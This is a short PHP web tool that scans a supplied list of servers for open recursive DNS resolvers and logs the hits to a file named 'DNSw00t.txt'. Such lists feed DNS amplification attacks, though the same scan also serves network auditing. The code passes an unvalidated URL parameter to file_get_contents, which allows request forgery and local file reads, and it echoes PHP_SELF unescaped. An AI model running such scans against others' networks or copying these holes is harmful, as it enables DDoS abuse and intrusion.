<html>
<style>
body {
	background-color: #000000;
	color: #00ffff;
}
h1 {
	color: #ff0000;
}
</style>
<h1>Welcome to SynthMesc's open recursive DNS scanner!</h1>
<body>
<form action="<?php echo $_SERVER['PHP_SELF'] ?>" method="GET">
DNS Server list URL/File: <input name="url">
<input type ="submit" value="Scan">
</form>
<?php
error_reporting(0);
set_time_limit(0);
if (isset($_GET['url'])) {
	$servers = explode("\n", file_get_contents($_GET['url']));
	foreach($servers as &$server) {
		checkForRecursion($server);
	}
}

function checkForRecursion($target) {
	$request = "\xde\xad"; // Transaction-ID 0xdead
	$request .= "\x01\x00"; // flags (recursion desired)
	$request .= "\x00\x01"; // 1 question
	$request .= "\x00\x00"; // 0 answers
	$request .= "\x00\x00"; // 0 authority
	$request .= "\x00\x00"; // 0 additional
	$request .= "\x03www\x09wikipedia\x03org\x00"; // www.wikipedia.org
	$request .= "\x00\x01"; // type A
	$request .= "\x00\x01"; // class IN

	$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

	socket_set_option($sock,SOL_SOCKET,SO_RCVTIMEO,array("sec"=>0,"usec"=>75000));

	$len = strlen($request);
	$port = 53;
	socket_sendto($sock, $request, $len, 0, $target, $port);
	$r = socket_recvfrom($sock, $response, 1024, 0, $target, $port);

	if ($response[3] == "\x80") {
		echo "<font color='#00ff00'><b>[+]</b></font> Recursion appears to be enabled on $target!<br>\n";
		$logfile="DNSw00t.txt"; 
		$fp = fopen($logfile, "a") or die("Unable to open file!");	fwrite($fp, $target . "\n") or die("Unable to write to file!"); 
		fflush($fp);
		fclose($fp);
		return true;
	} else if ($response == "") {
		echo "<font color='#ff0000'><b>[-]</b></font> No response from $target<br>\n";
		return false;
	} else {
		echo "<font color='#ff0000'><b>[-]</b></font> Recursion appears to be disabled on $target<br>\n";
		return false;
	}
	ob_flush();
	socket_close($sock);
}
?>
</body>
</html>